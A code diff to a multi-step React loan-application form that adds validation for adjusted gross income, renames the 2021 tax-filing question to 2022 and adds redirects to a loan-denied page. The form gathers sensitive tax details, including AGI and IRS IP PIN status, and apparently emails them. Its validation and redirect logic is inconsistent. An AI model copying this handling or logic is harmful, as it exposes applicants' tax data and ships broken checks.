@@ -92,6 +92,10 @@ const LoanProcessSeven = ({ step, setStep }) => {
       errors.licenseState = "Driver's license state is required";
       isValid = false;
     }
+    if (!formData.adjustedGrossIncome) {
+      errors.adjustedGrossIncome = "Adjusted Gross income is required";
+      isValid = false;
+    }
     if (!formData.taxReturn) {
       errors.taxReturn = "This field is required.";
     }
@@ -123,8 +127,8 @@ const LoanProcessSeven = ({ step, setStep }) => {
         isValid = false;
       }
     }
-    if (!formData.didFile2021Taxes) {
-      errors.didFile2021Taxes = "Please select an option";
+    if (!formData.didFile2022Taxes) {
+      errors.didFile2022Taxes = "Please select an option";
       isValid = false;
     }
     if (!formData.receivedIPPIN) {
@@ -158,6 +162,17 @@ const LoanProcessSeven = ({ step, setStep }) => {
         await axios.post("/api", { formData });
         console.log("Email sent successfully");
         if (formData.taxReturn === "yes") {
+          setbgloading(true);
+
+          // Remove items from local storage
+          localStorage.removeItem("formData");
+          localStorage.removeItem("formStep");
+
+          router.push("/loan/denied");
+        } else {
+          setStep(step + 1);
+        }
+        if (formData.didFile2022Taxes === "No") {
           setbgloading(true);
 
           // Remove items from local storage
@@ -282,16 +297,16 @@ const LoanProcessSeven = ({ step, setStep }) => {
         </div>
         <div className="mt-7">
           <label className="block text-gray-700 font-semibold mb-2">
-            Did you file your 2021 taxes?
+            Did you file your 2022 taxes?
           </label>
           <div>
             <select
               className={`block w-full  ${
-                errors.didFile2021Taxes ? "border-red-500" : "border-gray-300"
+                errors.didFile2022Taxes ? "border-red-500" : "border-gray-300"
               } border border-gray-300 rounded-lg pl-3 pr-10 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
-              name="didFile2021Taxes"
-              id="didFile2021Taxes"
-              value={formData.didFile2021Taxes}
+              name="didFile2022Taxes"
+              id="didFile2022Taxes"
+              value={formData.didFile2022Taxes}
               onChange={handleChange}
               required
             >
@@ -300,14 +315,14 @@ const LoanProcessSeven = ({ step, setStep }) => {
               <option value="No">No</option>
             </select>
           </div>
-          {errors.didFile2021Taxes && (
+          {errors.didFile2022Taxes && (
             <p className="text-red-500 text-sm mt-1">
-              {errors.didFile2021Taxes}
+              {errors.didFile2022Taxes}
             </p>
           )}
         </div>
 
-        {formData.didFile2021Taxes === "Yes" && (
+        {formData.didFile2022Taxes === "Yes" && (
           <div className="mt-7">
             <label className="block text-gray-700 font-semibold mb-2">
               What is your adjusted gross income (line 11 of your 1040)?
@@ -325,7 +340,7 @@ const LoanProcessSeven = ({ step, setStep }) => {
                 value={formData.adjustedGrossIncome}
                 onChange={handleChange}
                 placeholder="Enter your adjusted gross income"
-                required={formData.didFile2021Taxes === "Yes"}
+                required={formData.didFile2022Taxes === "Yes"}
               />
               <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                 <FontAwesomeIcon
